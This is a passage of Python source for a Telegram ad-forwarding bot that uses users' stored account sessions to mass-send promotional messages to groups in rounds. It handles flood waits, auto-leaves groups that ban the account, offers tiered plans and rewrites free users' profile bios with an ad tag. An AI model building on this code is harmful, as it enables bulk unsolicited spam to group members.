                    await add_user_log(user_id, "No groups configured - waiting")
                    await asyncio.sleep(60)
                    continue
                
                sent = 0
                failed = 0
                skipped = 0
                
                for i, group in enumerate(groups_to_forward):
                    acc = accounts_col.find_one({'_id': account_id})
                    if not acc or not acc.get('is_forwarding'):
                        break
                    
                    group_key = group.get('key', group.get('title', 'unknown'))
                    wait_remaining = get_flood_wait(account_id, group_key)
                    if wait_remaining > 0:
                        skipped += 1
                        print(f"[FORWARDING] Skipped {group['title']} (flood wait: {wait_remaining // 60}m)")
                        continue
                    
                    msg = ads[i % len(ads)] if ads_mode == 'saved' else None
                    
                    try:
                        sent_msg_id = None
                        current_entity = None
                        current_topic_id = None
                        
                        if group['type'] == 'topic':
                            peer = group['peer']
                            current_topic_id = group.get('topic_id')
                            current_entity = None
                            
                            try:
                                if isinstance(peer, str):
                                    current_entity = await client.get_entity(peer)
                                elif isinstance(peer, int):
                                    if peer > 0:
                                        peer = int('-100' + str(peer))
                                    current_entity = await client.get_entity(peer)
                            except:
                                pass
                            
                            if current_entity is None:
                                raise Exception(f"Cannot resolve topic peer: {peer}")
                            
                            group_name = getattr(current_entity, 'title', group['title'])[:30]
                            
                            if ads_mode == 'custom':
                                if current_topic_id:
                                    r = await client.send_message(current_entity, custom_text, reply_to=current_topic_id)
                                else:
                                    r = await client.send_message(current_entity, custom_text)
                                sent_msg_id = getattr(r, 'id', None)

                            elif ads_mode == 'post':
                                if current_topic_id:
                                    sent_msg_id = await forward_message(client, current_entity, post_source_msg_id, post_source_input_peer, current_topic_id)
                                else:
                                    result = await client.forward_messages(current_entity, post_source_msg_id, post_source_entity)
                                    if result:
                                        if isinstance(result, list):
                                            sent_msg_id = result[0].id if len(result) > 0 else None
                                        else:
                                            sent_msg_id = result.id

                            else:
                                if current_topic_id:
                                    sent_msg_id = await forward_message(client, current_entity, msg.id, msg.peer_id, current_topic_id)
                                else:
                                    result = await client.forward_messages(current_entity, msg.id, 'me')
                                    if result:
                                        if isinstance(result, list):
                                            sent_msg_id = result[0].id if len(result) > 0 else None
                                        else:
                                            sent_msg_id = result.id
                        else:
                            current_entity = None
                            group_id = group['group_id']
                            
                            if group.get('username'):
                                try:
                                    current_entity = await client.get_entity(group['username'])
                                except:
                                    pass
                            
                            if current_entity is None:
                                try:
                                    full_id = int('-100' + str(abs(group_id))) if group_id > 0 else group_id
                                    current_entity = await client.get_entity(full_id)
                                except:
                                    pass
                            
                            if current_entity is None and group.get('access_hash'):
                                try:
                                    current_entity = InputPeerChannel(channel_id=abs(group_id), access_hash=group['access_hash'])
                                except:
                                    pass
                            
                            if current_entity is None:
                                raise Exception(f"Cannot resolve entity for group {group_id}")
                            
                            group_name = group['title'][:30]

                            if ads_mode == 'custom':
                                r = await client.send_message(current_entity, custom_text)
                                sent_msg_id = getattr(r, 'id', None)

                            elif ads_mode == 'post':
                                result = await client.forward_messages(current_entity, post_source_msg_id, post_source_entity)
                                if result:
                                    if isinstance(result, list):
                                        sent_msg_id = result[0].id if len(result) > 0 else None
                                    else:
                                        sent_msg_id = result.id

                            else:
                                result = await client.forward_messages(current_entity, msg.id, 'me')
                                if result:
                                    if isinstance(result, list):
                                        sent_msg_id = result[0].id if len(result) > 0 else None
                                    else:
                                        sent_msg_id = result.id
                        
                        sent += 1
                        print(f"[FORWARDING] Sent to {group_name} ({i+1}/{len(groups_to_forward)})")
                        await add_user_log(user_id, f"Sent to {group_name}")
                        
                        # Send logs (now free for everyone)
                        if sent_msg_id and current_entity:
                            view_link = build_message_link(current_entity, sent_msg_id, current_topic_id)
                            if view_link:
                                await send_log(account_id, None, view_link=view_link, group_name=group_name)
                        
                        # Update stats in correct collection
                        update_account_stats(str(account_id), sent=1)
                        
                    except FloodWaitError as e:
                        wait_time = e.seconds
                        failed += 1
                        set_flood_wait(account_id, group_key, group['title'], wait_time)
                        print(f"[FORWARDING] FloodWait {wait_time // 60}m for {group['title']} - will skip until expires")
                        await add_user_log(user_id, f"FloodWait {wait_time // 60}m in {group['title'][:20]}")
                        
                    except (ChannelPrivateError, ChatWriteForbiddenError, UserBannedInChannelError) as e:
                        failed += 1
                        mark_group_failed(account_id, group_key, str(e))
                        print(f"[FORWARDING] Permanent fail {group['title']}: {type(e).__name__}")

                        # Auto-leave the group if sending fails (only if enabled)
                        if _is_auto_leave_enabled(user_id):
                            try:
                                if current_entity is not None:
                                    left_ok = await safe_leave_chat(client, current_entity)
                                    if left_ok:
                                        remove_group_from_db(acc_id_str, group.get('type'), group_key, group)
                                        await notify_auto_left(account_id, acc.get('phone'), group.get('title'), group_key, reason=type(e).__name__)
                                    await add_user_log(user_id, f"Auto-left {group['title'][:20]} after failure")
                            except Exception as le:
                                print(f"[FORWARDING] Leave failed: {str(le)[:80]}")
                        else:
                            await add_user_log(user_id, f"Auto-leave disabled; kept {group['title'][:20]}")
                        
                    except Exception as e:
                        failed += 1
                        error_str = str(e)
                        wait_match = re.search(r'wait of (\d+) seconds', error_str, re.IGNORECASE)
                        if wait_match:
                            wait_time = int(wait_match.group(1))
                            set_flood_wait(account_id, group_key, group['title'], wait_time)
                        else:
                            print(f"[FORWARDING] Error {group['title']}: {error_str[:50]}")

                            # Auto-leave on any non-flood send failure (only if enabled)
                            if _is_auto_leave_enabled(user_id):
                                try:
                                    if current_entity is not None:
                                        left_ok = await safe_leave_chat(client, current_entity)
                                        if left_ok:
                                            remove_group_from_db(acc_id_str, group.get('type'), group_key, group)
                                            await notify_auto_left(account_id, acc.get('phone'), group.get('title'), group_key, reason=error_str[:120])
                                        await add_user_log(user_id, f"Auto-left {group['title'][:20]} after failure")
                                except Exception as le:
                                    print(f"[FORWARDING] Leave failed: {str(le)[:80]}")
                            else:
                                await add_user_log(user_id, f"Auto-leave disabled; kept {group['title'][:20]}")

                        # Update stats in correct collection
                        update_account_stats(str(account_id), failed=1)
                    
                    await asyncio.sleep(msg_delay)
                
                print(f"[FORWARDING] Round complete. Sent: {sent}, Failed: {failed}, Skipped: {skipped}")
                try:
                    await send_log(account_id, f"<b>✅ Round {round_num} Completed</b>\n\n📤 <b>Sent:</b> <code>{sent}</code> | ❌ <b>Failed:</b> <code>{failed}</code> | ⏭ <b>Skipped:</b> <code>{skipped}</code>\n\n⏰ <b>Next Round:</b> <code>{round_delay}s</code>")
                except Exception:
                    pass
                await add_user_log(user_id, f"Round: {sent} sent, {failed} failed, {skipped} skipped")
                
                # Check if still forwarding before waiting for next round
                if not acc.get('is_forwarding', False):
                    print(f"[{account_id}] Stopped before round delay")
                    break
                
                # ===== Auto Sleep: 2AM - 6AM daily =====
                user = get_user(user_id)
                auto_sleep_enabled = user.get('auto_sleep_enabled', False)

                if auto_sleep_enabled:
                    # Use IST (Indian Standard Time = UTC+5:30)
                    from datetime import timezone, timedelta
                    IST = timezone(timedelta(hours=5, minutes=30))
                    now_ist = datetime.now(IST)
                    current_hour_ist = now_ist.hour
                    # If current IST time is between 2AM and 6AM, sleep until 6AM IST
                    if 2 <= current_hour_ist < 6:
                        # Calculate seconds remaining until 6:00 AM IST
                        wake_time_ist = now_ist.replace(hour=6, minute=0, second=0, microsecond=0)
                        sleep_seconds = int((wake_time_ist - now_ist).total_seconds())
                        print(f"[FORWARDING] Auto Sleep IST: 2AM-6AM window active. Sleeping {sleep_seconds}s until 6AM IST...")
                        try:
                            await send_log(account_id,
                                f"<b>💤 Auto Sleep Activated</b>\n\n"
                                f"🕑 <b>Window:</b> <code>2:00 AM – 6:00 AM IST</code>\n"
                                f"⏰ <b>Resuming at:</b> <code>6:00 AM IST</code>\n"
                                f"<i>Bot will resume forwarding automatically.</i>"
                            )
                        except Exception:
                            pass

                        for _ in range(sleep_seconds):
                            acc = get_account_by_id(account_id)
                            if not acc or not acc.get('is_forwarding', False):
                                print(f"[{account_id}] Stopped during auto sleep window")
                                break
                            await asyncio.sleep(1)

                        try:
                            await send_log(account_id,
                                f"<b>⏰ Auto Sleep Complete</b>\n\n"
                                f"<i>It's 6:00 AM IST — resuming forwarding now!</i>"
                            )
                        except Exception:
                            pass
                
                # Normal round delay
                print(f"[FORWARDING] Waiting {round_delay}s for next round...")
                for _ in range(round_delay):
                    # Check every second if forwarding was stopped
                    acc = get_account_by_id(account_id)
                    if not acc or not acc.get('is_forwarding', False):
                        print(f"[{account_id}] Stopped during round delay")
                        break
                    await asyncio.sleep(1)
                
            except asyncio.CancelledError:
                print(f"[FORWARDING] Task cancelled for account {account_id}")
                break
        
    except asyncio.CancelledError:
        print(f"[FORWARDING] Task cancelled for account {account_id}")
    except Exception as e:
        print(f"[FORWARDING] Error in loop: {e}")
        import traceback
        traceback.print_exc()
    finally:
        if client:
            try:
                await client.disconnect()
                print(f"[FORWARDING] Client disconnected for account {account_id}")
            except:
                pass
        if account_id in forwarding_tasks:
            del forwarding_tasks[account_id]

async def forward_message(client, to_entity, msg_id, from_peer, topic_id=None):
    random_id = random.randint(1, 2147483647)
    result = await client(ForwardMessagesRequest(
        from_peer=from_peer,
        id=[msg_id],
        random_id=[random_id],
        to_peer=to_entity,
        top_msg_id=topic_id
    ))
    if result.updates:
        for update in result.updates:
            if hasattr(update, 'message') and hasattr(update.message, 'id'):
                return update.message.id
    return None

def build_message_link(entity, msg_id, topic_id=None):
    username = getattr(entity, 'username', None)
    if username:
        base = f"https://t.me/{username}"
    else:
        chat_id = getattr(entity, 'id', None)
        if chat_id:
            base = f"https://t.me/c/{chat_id}"
        else:
            return None
    
    if topic_id:
        return f"{base}/{topic_id}/{msg_id}" if msg_id else f"{base}/{topic_id}"
    return f"{base}/{msg_id}" if msg_id else base

async def refresh_account_groups(client, account_id):
    """Refresh groups for an account and return count of groups found."""
    try:
        dialogs = await client.get_dialogs(limit=None)
        groups = []
        for d in dialogs:
            e = d.entity
            if isinstance(e, User):
                continue
            if not isinstance(e, (Channel, Chat)):
                continue
            if isinstance(e, Channel) and e.broadcast:
                continue
            title = getattr(e, 'title', 'Unknown')
            if title and title != 'Unknown':
                group_id = e.id
                access_hash = getattr(e, 'access_hash', None)
                username = getattr(e, 'username', None)
                is_channel = isinstance(e, Channel)
                
                if access_hash is None and is_channel:
                    try:
                        full_entity = await client.get_entity(e)
                        access_hash = getattr(full_entity, 'access_hash', None)
                    except:
                        pass
                
                groups.append({
                    'account_id': str(account_id),
                    'group_id': group_id,
                    'title': title,
                    'access_hash': access_hash,
                    'username': username,
                    'is_channel': is_channel
                })
        
        # Save to database (update or insert)
        for g in groups:
            account_auto_groups_col.update_one(
                {'account_id': str(account_id), 'group_id': g['group_id']},
                {'$set': g},
                upsert=True
            )
        
        return len(groups)
    except Exception as e:
        print(f"[refresh_account_groups] Error: {e}")
        return 0


async def fetch_groups_for_account(client, account_id):
    """Compatibility wrapper used by the dashboard refresh action."""
    return await refresh_account_groups(client, account_id)


async def fetch_groups(client, account_id, phone):
    try:
        dialogs = await client.get_dialogs(limit=None)
        groups = []
        for d in dialogs:
            e = d.entity
            if isinstance(e, User):
                continue
            if not isinstance(e, (Channel, Chat)):
                continue
            if isinstance(e, Channel) and e.broadcast:
                continue
            title = getattr(e, 'title', 'Unknown')
            if title and title != 'Unknown':
                group_id = e.id
                access_hash = getattr(e, 'access_hash', None)
                username = getattr(e, 'username', None)
                is_channel = isinstance(e, Channel)
                
                if access_hash is None and is_channel:
                    try:
                        full_entity = await client.get_entity(e)
                        access_hash = getattr(full_entity, 'access_hash', None)
                    except:
                        pass
                
                groups.append({
                    # store account_id consistently as string (ObjectId -> str)
                    'account_id': str(account_id),
                    'phone': phone,
                    'group_id': group_id,
                    'title': title,
                    'username': username,
                    'access_hash': access_hash,
                    'is_channel': is_channel,
                    'added_at': datetime.now()
                })
        if groups:
            # Remove any older variants (ObjectId vs str)
            account_auto_groups_col.delete_many({'account_id': {'$in': _account_id_variants(account_id)}})
            account_auto_groups_col.insert_many(groups)
        return len(groups)
    except Exception as e:
        print(f"Fetch groups error: {e}")
        return 0

# ===================== UI Helpers =====================

def _h(s: str) -> str:
    """Basic HTML escape for user-provided strings."""
    try:
        return (
            str(s)
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
        )
    except Exception:
        return ""


def ui_title(title: str) -> str:
    return f"<b>{_h(title)}</b>"


def ui_kv(key: str, val: str) -> str:
    return f"<b>{_h(key)}:</b> {_h(val)}"


def ui_section(title: str, lines: list[str]) -> str:
    body = "\n".join(lines).strip()
    return f"<b>{_h(title)}</b>\n{body}" if body else f"<b>{_h(title)}</b>"


def ui_divider() -> str:
    return "\n\n"


def render_plan_select_text() -> str:
    return (
        "<b>💎 Choose Your Plan</b>\n\n"
        "<blockquote>Pick a plan that matches your needs. You can upgrade anytime.</blockquote>\n\n"
        "<b>Plans:</b> Scout (Free) • Grow • Prime • Dominion"
    )


def render_welcome_text() -> str:
    return (
        "🚀 Welcome to GO ADS BOT\n\n"
        "Automate your Telegram advertising campaigns across multiple groups.\n\n"
        "Get started: Tap GO ADS BOT Ads Now to choose a plan and add your first account."
    )


def render_dashboard_text(uid: int) -> str:
    user = get_user(uid)
    max_acc = user.get('max_accounts', 1)
    
    # Determine plan name and expiry
    if is_admin(uid):
        plan_name = "Admin"
        max_acc = 999
        expiry_text = "999d"
    elif is_premium(uid):
        # Use stored plan_name if available, otherwise derive from max_accounts
        plan_name = user.get('plan_name', 'Premium')
        if not user.get('plan_name'):
            # Backward compatibility: derive from max_accounts
            if max_acc >= 15:
                plan_name = "Dominion"
            elif max_acc >= 7:
                plan_name = "Prime"
            else:
                plan_name = "Grow"
        
        # Calculate expiry countdown
        expires_at = user.get('premium_expires_at')
        if expires_at and isinstance(expires_at, datetime):
            remaining = expires_at - datetime.now()
            if remaining.total_seconds() > 0:
                days_left = remaining.days
                expiry_text = f"{days_left}d"
            else:
                expiry_text = "Expired"
        else:
            expiry_text = "∞"  # Legacy users without expiry
    else:
        plan_name = "Scout: Free"
        expiry_text = "∞"
    
    accounts = get_user_accounts(uid)
    active = sum(1 for a in accounts if a.get('is_forwarding'))
    
    # Fix mode display to show user-friendly text
    mode_raw = user.get('forwarding_mode', 'topics')
    if mode_raw == 'topics':
        mode_display = "Topics Only"
    elif mode_raw == 'auto':
        mode_display = "Groups Only"
    elif mode_raw == 'both':
        mode_display = "Topics & Groups"
    else:
        mode_display = mode_raw.capitalize()
    
    # Get interval display name (Slow/Medium/Fast, not Safe/Balanced/Risky)
    preset = user.get('interval_preset', 'medium')
    preset_display = preset.capitalize()

    return (
        "<b>🏠 Dashboard</b>\n\n"
        "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        "<b>📊 Overview:</b>\n"
        f"├ <b>Plan:</b> <code>{plan_name} ({expiry_text})</code>\n"
        f"├ <b>Accounts:</b> <code>{len(accounts)}/{max_acc}</code> (Active: <code>{active}</code>)\n"
        f"├ <b>Mode:</b> <code>{mode_display}</code>\n"
        f"└ <b>Interval:</b> <code>{preset_display}</code>\n\n"
        "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
    )


# ===================== Keyboards =====================

def new_welcome_keyboard():
    """New welcome screen with single GO ADS BOT Ads Now button."""
    return [
        [Button.inline("GO ADS BOT Ads Now", b"adsye_now")],
        [Button.url("Support", MESSAGES['support_link']), Button.url("Updates", MESSAGES['updates_link'])]
    ]

def plan_select_keyboard(user_id=None):
    """Plan selection: Scout, Grow, Prime, Dominion (2x2 grid layout)."""
    user = get_user(user_id) if user_id else None
    user_plan = user.get('plan_name', '').lower() if user else None
    is_prem = is_premium(user_id) if user_id else False
    
    # Check if premium has expired
    if is_prem and user:
        expires_at = user.get('premium_expires_at')
        if expires_at and isinstance(expires_at, datetime):
            if expires_at < datetime.now():
                # Premium expired - reset to Scout
                is_prem = False
                user_plan = 'scout'
    
    buttons = []
    
    # First row: Scout + Grow (hide Scout for active premium users)
    row1 = []
    if not is_prem:
        scout_label = "✓ Scout (Active)" if user_plan == 'scout' else "Scout (Free)"
        row1.append(Button.inline(scout_label, b"plan_scout"))
    
    # Show "✓ Active" if user has this plan
    grow_label = "✓ Grow (Active)" if user_plan == 'grow' and is_prem else f"Grow ({PLANS['grow']['price_display']})"
    row1.append(Button.inline(grow_label, b"plan_grow"))
    buttons.append(row1)
    
    # Second row: Prime + Dominion
    prime_label = "✓ Prime (Active)" if user_plan == 'prime' and is_prem else f"Prime ({PLANS['prime']['price_display']})"
    dominion_label = "✓ Dominion (Active)" if user_plan == 'dominion' and is_prem else f"Dominion ({PLANS['dominion']['price_display']})"
    buttons.append([
        Button.inline(prime_label, b"plan_prime"),
        Button.inline(dominion_label, b"plan_dominion")
    ])
    
    # Dashboard button
    buttons.append([Button.inline("🏠 Dashboard", b"enter_dashboard")])
    
    return buttons

def tier_selection_keyboard():
    return [
        [Button.inline("Free", b"tier_free"), Button.inline("Premium", b"tier_premium")],
        [Button.inline("Back", b"back_start")]
    ]

def main_dashboard_keyboard(user_id):
    accounts = get_user_accounts(user_id)
    has_active = any(acc.get('is_forwarding') for acc in accounts)
    ads_btn = "\u23F9\uFE0F Stop Ads" if has_active else "\u25B6\uFE0F Start Ads"  # ⏹️ / ▶️
    ads_data = b"stop_all_ads" if has_active else b"start_all_ads"

    buttons = [
        [Button.inline("\U0001F4CB Accounts", b"menu_account"), Button.inline("\U0001F4CA Analytics", b"menu_analytics")],  # 📋 📊
        [Button.inline("\u23F1\uFE0F Intervals", b"menu_interval"), Button.inline("\U0001F504 Fwd Mode", b"menu_fwd_mode")],  # ⏱️ 🔄
    ]

    # Settings and Plans row
    buttons.append([
        Button.inline("\u2699\uFE0F Settings", b"menu_settings"),  # ⚙️
        Button.inline("\U0001F48E Plans", b"back_plans"),          # 💎
    ])
    
    # Row 3: Start Ads + My Profile + Admin (for admins)
    if is_admin(user_id):
        buttons.append([
            Button.inline(ads_btn, ads_data), 
            Button.inline("\U0001F464 My Profile", b"my_profile"),  # 👤
            Button.inline("\u2699\uFE0F Admin", b"admin_panel")
        ])
    else:
        buttons.append([
            Button.inline(ads_btn, ads_data), 
            Button.inline("\U0001F464 My Profile", b"my_profile")  # 👤
        ])
    
    return buttons

def account_list_keyboard(user_id, page=0):
    accounts = get_user_accounts(user_id)
    max_accounts = get_user_max_accounts(user_id)
    total = len(accounts)
    pages = max(1, (total + ACCOUNTS_PER_PAGE - 1) // ACCOUNTS_PER_PAGE)
    
    start = page * ACCOUNTS_PER_PAGE
    end = min(start + ACCOUNTS_PER_PAGE, total)
    page_accounts = accounts[start:end]
    
    buttons = []
    for i, acc in enumerate(page_accounts):
        idx = start + i + 1
        name = acc.get('name', 'Unknown')
        # Add emoji based on status - Green tick for active, Red X for inactive
        status_emoji = "✅" if acc.get('is_forwarding') else "❌"
        status_text = "Active" if acc.get('is_forwarding') else "Inactive"
        # Format: [Status Emoji] Status #Number - Full Name
        buttons.append([Button.inline(f"{status_emoji} {status_text} #{idx} - {name}", f"acc_{acc['_id']}")])
    
    nav = []
    if page > 0:
        nav.append(Button.inline("⬅️ Prev", f"accpage_{page-1}"))
    if page < pages - 1:
        nav.append(Button.inline("➡️ Next", f"accpage_{page+1}"))
    if nav:
        buttons.append(nav)
    
    if total >= max_accounts:
        buttons.append([Button.inline("➕ Add Account 🔒", b"account_limit_reached"), Button.inline("🗑️ Delete Account", b"delete_account_menu")])
    else:
        buttons.append([Button.inline("➕ Add Account", b"add_account"), Button.inline("🗑️ Delete Account", b"delete_account_menu")])
    buttons.append([Button.inline("🔙 Back", b"enter_dashboard")])
    
    return buttons

def settings_menu_keyboard(uid):
    """Settings menu with Auto Reply, Topics, Logs, Smart Rotation, Auto Group Join, Refresh All Groups, Auto Leave."""
    # Use Unicode escape sequences to avoid any editor/encoding corruption
    buttons = []
    
    # Auto Reply - Show locked for free users
    if is_premium(uid):
        buttons.append([Button.inline("\U0001F4AC Auto Reply", b"menu_autoreply")])  # 💬
    else:
        buttons.append([Button.inline("\U0001F4AC Auto Reply 🔒", b"locked_autoreply")])  # 💬🔒
    
    # Topics - Show locked for free users
    if is_premium(uid):
        buttons.append([Button.inline("\U0001F4C2 Topics", b"menu_topics")])  # 📂
    else:
        buttons.append([Button.inline("\U0001F4C2 Topics 🔒", b"locked_topics")])  # 📂🔒
    
    buttons.extend([
        [Button.inline("\U0001F4DD Logs", b"menu_logs")],            # 📝
        [Button.inline("\U0001F4E3 Ads Mode", b"menu_ads_mode")],     # 📣
    ])
    
    # Premium-only features (show locked for free users)
    if is_premium(uid):
        buttons.append([Button.inline("\U0001F504 Smart Rotation", b"menu_smart_rotation")])  # 🔄
        buttons.append([Button.inline("\U0001F465 Auto Group Join", b"menu_auto_group_join")])  # 👥
    else:
        buttons.append([Button.inline("\U0001F504 Smart Rotation 🔒", b"locked_smart_rotation")])
        buttons.append([Button.inline("\U0001F465 Auto Group Join 🔒", b"locked_auto_group_join")])
    
    # Refresh All Groups - FREE for everyone
    buttons.append([Button.inline("🔄 Refresh All Groups", b"refresh_all_groups")])
    
    # Auto Leave Failed Groups toggle
    user_doc = get_user(uid)
    auto_leave_enabled = user_doc.get('auto_leave_groups', True)
    leave_status = "✅ ON" if auto_leave_enabled else "❌ OFF"
    buttons.append([Button.inline(f"Auto Leave Failed: {leave_status}", b"toggle_auto_leave")])
    
    # Auto Sleep - Available for ALL users
    buttons.append([Button.inline("\U0001F4A4 Auto Sleep", b"menu_auto_sleep")])  # 💤
    
    buttons.append([Button.inline("\u2190 Back", b"enter_dashboard")])  # ←
    return buttons
def interval_menu_keyboard(user_id):
    user = get_user(user_id)
    current = user.get('interval_preset', 'medium')

    def mark_for(key: str) -> str:
        return " ✅" if key == current else ""

    # All plans can use slow, medium, fast (risky) presets
    slow = Button.inline(f"{INTERVAL_PRESETS['slow']['name']}{mark_for('slow')}", b"interval_slow")
    medium = Button.inline(f"{INTERVAL_PRESETS['medium']['name']}{mark_for('medium')}", b"interval_medium")
    fast = Button.inline(f"{INTERVAL_PRESETS['fast']['name']}{mark_for('fast')}", b"interval_fast")

    # Custom intervals are premium-only (Grow, Prime, Dominion plans)
    if is_premium(user_id):
        custom_mark = " ✅" if current == 'custom' else ""
        custom = Button.inline(f"Custom Settings{custom_mark}", b"interval_custom")
    else:
        # Free plan: show button but mark as locked
        custom = Button.inline("Custom Settings 🔒", b"interval_locked")

    return [
        [slow, medium],
        [fast, custom],
        [Button.inline("Back", b"enter_dashboard")],
    ]

def autoreply_menu_keyboard(user_id):
    if is_premium(user_id):
        user = get_user(user_id)
        enabled = user.get('autoreply_enabled', True)
        
        # Check if user has set a custom message
        accounts = get_user_accounts(user_id)
        has_custom = False
        if accounts:
            for acc in accounts:
                settings_doc = account_settings_col.find_one({'account_id': str(acc['_id'])})
                if settings_doc and 'auto_reply' in settings_doc and settings_doc.get('auto_reply'):
                    has_custom = True
                    break
        
        # Single toggle button: show the opposite action only
        toggle_btn = Button.inline("Turn OFF" if enabled else "Turn ON", b"autoreply_toggle")
        buttons = [[toggle_btn]]
        
        # Only show "View Current" if custom message is set
        if has_custom:
            buttons.append([Button.inline("View Current", b"autoreply_view")])
        
        buttons.append([Button.inline("Set Custom Reply", b"autoreply_custom")])
        buttons.append([Button.inline("← Back", b"menu_settings")])
    else:
        # Free users - auto-reply locked
        buttons = [
            [Button.inline("🔒 Locked - Premium Only", b"go_premium")],
            [Button.inline("← Back", b"menu_settings")]
        ]
    return buttons

def delete_account_list_keyboard(user_id):
    accounts = get_user_accounts(user_id)
    buttons = []
    for acc in accounts:
        phone = acc['phone']
        name = acc.get('name', 'Unknown')[:12]
        buttons.append([Button.inline(f"Delete: {phone[-4:]} - {name}", f"confirm_del_{acc['_id']}")])
    buttons.append([Button.inline("Back", b"menu_account")])
    return buttons

def premium_contact_keyboard():
    return [
        [Button.url("Contact Admin", MESSAGES['support_link'])],
        [Button.inline("Back", b"enter_dashboard")]
    ]


async def apply_account_profile_templates(user_id: int):
    """Update all added accounts' profile last name + bio using templates from config.

    - First name is kept as-is
    - For FREE users ONLY: Last name forced to MESSAGES['account_last_name_tag'], Bio forced to MESSAGES['account_bio']
    - For PREMIUM users: Bio and last name are NOT changed (left as-is)
    """
    try:
        # Check if user is premium - premium users keep their original profile
        if is_premium(user_id):
            return  # Don't modify premium user accounts
        
        last_name = MESSAGES.get('account_last_name_tag', '')
        about = MESSAGES.get('account_bio', '')
        if not last_name and not about:
            return

        accounts = list(accounts_col.find({'owner_id': int(user_id)}))
        for acc in accounts:
            session = acc.get('session')
            if not session:
                continue

            # DECRYPT session before using it
            try:
                decrypted_session = cipher_suite.decrypt(session.encode()).decode()
            except Exception:
                continue

            client = TelegramClient(StringSession(decrypted_session), CONFIG['api_id'], CONFIG['api_hash'])
            try:
                await client.connect()
                me = await client.get_me()
                first_name = me.first_name or ''

                await client(UpdateProfileRequest(
                    first_name=first_name,
                    last_name=last_name,
                    about=about,
                ))
            except Exception:
                pass
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass
    except Exception:
        return

def admin_panel_keyboard():
    # Layout requested:
    # Row 1: All Users | Premium Users
    # Row 2: Full Stats | Grant Premium
    # Row 3: Manage Accounts | Banned Users
    # Row 4: Admins
    # Row 5: Back
    return [
        [Button.inline("👥 All Users", b"admin_all_users"), Button.inline("💎 Premium Users", b"admin_premium")],
        [Button.inline("📊 Full Stats", b"admin_users"), Button.inline("✅ Grant Premium", b"admin_grant_premium")],
        [Button.inline("📱 Manage Accounts", b"admin_manage_accounts"), Button.inline("🚫 Banned Users", b"admin_banned_users")],
        [Button.inline("👨‍💼 Admins", b"admin_admins")],
        [Button.inline("🔙 Back", b"enter_dashboard")]
    ]

def account_menu_keyboard(account_id, acc, user_id):
    fwd = acc.get('is_forwarding', False)
    # Start button removed per user request
    # Topics button removed per user request
    # Stats and Delete in same row
    buttons = [
        [Button.inline("Stats", f"stats_{account_id}"), Button.inline("Delete", f"delete_{account_id}")],
    ]
    
    if fwd:
        # Only show Stop button if account is currently running
        buttons.append([Button.inline("Stop", f"stop_{account_id}")])
    
    buttons.append([Button.inline("Back", b"enter_dashboard")])
    
    return buttons

def topics_menu_keyboard(account_id, user_id):
    tier_settings = get_user_tier_settings(user_id)
    max_topics = tier_settings.get('max_topics', 3)
    
    buttons = []
    row = []
    for i, t in enumerate(TOPICS[:max_topics]):
        count = account_topics_col.count_documents({'account_id': account_id, 'topic': t})
        row.append(Button.inline(f"{t.capitalize()} ({count})", f"topic_{account_id}_{t}"))
        
        # Add row when we have 3 buttons or it's the last topic
        if len(row) == 3 or i == max_topics - 1:
            buttons.append(row)
            row = []
    
    auto = account_auto_groups_col.count_documents({'account_id': account_id})
    buttons.append([Button.inline(f"Auto Groups ({auto})", f"auto_{account_id}")])
    buttons.append([Button.inline("Back", f"acc_{account_id}")])
    return buttons

def forwarding_select_keyboard(account_id, user_id):
    tier_settings = get_user_tier_settings(user_id)
    max_topics = tier_settings.get('max_topics', 3)
    
    buttons = []
    for t in TOPICS[:max_topics]:
        count = account_topics_col.count_documents({'account_id': account_id, 'topic': t})
        if count > 0:
            buttons.append([Button.inline(f"{t.capitalize()} ({count})", f"startfwd_{account_id}_{t}")])
    buttons.append([Button.inline("All Groups Only", f"startfwd_{account_id}_all")])
    buttons.append([Button.inline("Cancel", f"acc_{account_id}")])
    return buttons

def settings_keyboard(account_id, user_id):
    # Auto-reply button removed per user request
    buttons = [
        [Button.inline("Clear Failed", f"clearfailed_{account_id}")],
        [Button.inline("Back", f"acc_{account_id}")]
    ]
    return buttons

def otp_keyboard():
    return [
        [Button.inline("1", b"otp_1"), Button.inline("2", b"otp_2"), Button.inline("3", b"otp_3")],
        [Button.inline("4", b"otp_4"), Button.inline("5", b"otp_5"), Button.inline("6", b"otp_6")],
        [Button.inline("7", b"otp_7"), Button.inline("8", b"otp_8"), Button.inline("9", b"otp_9")],
        [Button.inline("Del", b"otp_back"), Button.inline("0", b"otp_0"), Button.inline("X", b"otp_cancel")],
        [Button.url("Get Code", "tg://openmessage?user_id=777000")]
    ]

@main_bot.on(events.NewMessage(pattern=r'^/start(?:@[\w_]+)?(?:\s|$)'))
async def cmd_start(event):
    uid = event.sender_id
    
    # Ban check - Block banned users
    if not is_admin(uid):
        user = get_user(uid)
        if user.get('banned'):
            reason = user.get('ban_reason', 'No reason provided')
            await event.respond(
                f"<b>🚫 You Are Banned</b>\n\n"
                f"<b>Reason:</b> <code>{reason}</code>\n\n"
                f"<i>You can no longer use this bot. Contact admin if you think this is a mistake.</i>",
                parse_mode='html'
            )
            return
        
        # Check if this is a new user and send notification
        if user.get('_is_new_user'):
            try:
                sender = await event.get_sender()
                asyncio.create_task(notify_new_user(
                    uid,
                    sender.username,
                    sender.first_name or "Unknown",
                    sender.last_name or "",
                    getattr(sender, 'phone', None)
                ))
                # Remove flag
                users_col.update_one({'user_id': int(uid)}, {'$unset': {'_is_new_user': ''}})
            except Exception as e:
                print(f"[NOTIFICATION] Error sending new user notification: {e}")
    else:
        get_user(uid)

    # Force-join gate (admin bypass)
    if not await enforce_forcejoin_or_prompt(event):
        return

    approve_user(uid)

    # Check if user has accounts
    accounts = get_user_accounts(uid)
    
    # If user activated any plan (free or premium), always show dashboard
    if is_approved(uid):
        # User has plan activated, show dashboard with welcome image
        dashboard_text = render_dashboard_text(uid)
        dashboard_buttons = main_dashboard_keyboard(uid)
        welcome_image = MESSAGES.get('welcome_image', '')
        
        if welcome_image:
            await event.respond(file=welcome_image, message=dashboard_text, parse_mode='html', buttons=dashboard_buttons)
        else:
            await event.respond(dashboard_text, parse_mode='html', buttons=dashboard_buttons)
    elif len(accounts) > 0:
        # User has accounts but no plan selected yet, show plan selection
        plan_msg = render_plan_select_text()
        
        welcome_image = MESSAGES.get('welcome_image', '')
        if welcome_image:
